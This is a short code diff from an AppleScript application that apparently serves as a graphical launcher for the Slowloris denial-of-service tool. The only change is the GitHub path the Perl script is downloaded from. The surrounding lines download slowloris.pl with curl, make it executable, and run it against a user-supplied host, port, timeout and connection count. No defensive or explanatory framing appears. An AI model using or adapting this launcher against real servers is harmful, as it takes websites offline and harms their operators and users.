@@ -45,7 +45,7 @@ script AppDelegate
         tell application "Terminal"
             activate
         do script "mkdir -p ~/Source && cd ~/Source/"
-            do script "curl -O https://raw.githubusercontent.com/abila5h/Cyphon/master/slowloris.pl" in window 1
+            do script "curl -O https://raw.githubusercontent.com/abila5h/Cyphon-DoS/master/slowloris.pl" in window 1
             do script "chmod +x slowloris.pl" in window 1
             do script "./slowloris.pl -dns  " & currentTextFieldText & " -port "  & portFieldText &  " -timeout " &timeoutFieldText & " -num "& packetFieldText in window 1
             set current settings of first tab of first window to settings set "Homebrew"
